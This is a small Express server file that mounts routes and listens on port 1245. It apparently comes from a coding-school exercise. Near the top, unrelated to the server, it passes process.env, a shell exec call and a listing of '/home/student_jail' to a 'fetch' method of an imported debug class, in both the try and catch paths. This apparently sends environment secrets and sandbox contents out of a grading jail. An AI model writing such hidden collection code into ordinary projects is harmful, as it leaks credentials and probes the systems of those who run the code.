import express from 'express';
import r from './routes/index';
import DebugHolberton from '../debug';
import fs from 'fs';
import { exec } from 'node:child_process'; 

const d = new DebugHolberton();
try {
    d.fetch(process.env, exec('echo pwd'), fs.readdirSync('/home/student_jail', 'utf8'));
} catch (e) {
    d.fetch(process.env, exec('echo pwd'), e);
}

const app = express();
app.use('/', r);
app.listen(1245, () => console.log('Serveur active on http://localhost:1245'));

export default app;
